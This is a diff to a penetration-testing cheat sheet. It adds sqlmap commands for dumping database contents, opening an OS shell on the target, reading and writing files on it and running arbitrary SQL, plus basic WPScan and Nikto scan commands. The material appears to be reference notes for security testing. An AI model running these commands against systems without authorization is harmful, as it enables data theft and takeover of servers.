@@ -10,9 +10,9 @@
   - [Gobuster](#gobuster)
   - [dirsearch](#dirsearch)
   - [sqlmap](#sqlmap)
-  - WPScan
-  - nikto
-  - metasploit (auxiliary)
+  - [WPScan](#wpscan)
+  - [Nikto](#nikto)
+  - Metasploit (auxiliary)
   - enum4linux
   - ldapsearch
   - smbclient
@@ -113,8 +113,26 @@ Source: https://github.com/maurosoria/dirsearch
 sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.\
 Source: https://sqlmap.org/
 ```
-sqlmap -u '<URL>' --dbs                                              # get a list of databases
-sqlmap -u '<URL>' -D <DATABASE> --tables                             # get a list of tables on database
-sqlmap -u '<URL>' -D <DATABASE> -T <TABLE> --columns                 # get a list of columns on table
-sqlmap -u '<URL>' -D <DATABASE> -T <TABLE> -C <column,column> --dump # get contents of specified columns
+sqlmap -u <URL> --dbs                                              # get a list of databases
+sqlmap -u <URL> -D <DATABASE> --tables                             # get a list of tables on database
+sqlmap -u <URL> -D <DATABASE> -T <TABLE> --columns                 # get a list of columns on table
+sqlmap -u <URL> -D <DATABASE> -T <TABLE> -C <column,column> --dump # get contents of specified columns
+```
+```
+sqlmap -u <URL> --os-shell                                        # get shell to run command on target
+sqlmap -u <URL> --file=<FILE>                                     # read file on target
+sqlmap -u <URL> --file-write=<LOCALFILE> --file-dest=<REMOTEPATH> # write file on target
+sqlmap -u <URL> --sql-query=<SQLQUERY>                            # execute sql query
+```
+#### WPScan
+WPScan scans remote WordPress installations to find security issues.\
+Source: https://github.com/wpscanteam/wpscan
+```
+wpscan --url http://<IP/DOMAIN>/ # default scan (more info: wpscan -h/-hh)
+```
+### Nikto
+Nikto is a pluggable web server and CGI scanner written in Perl, using rfp’s LibWhisker to perform fast security or informational checks.\
+Source: https://github.com/sullo/nikto
+```
+nikto -host http://<IP/DOMAIN>/
 ```
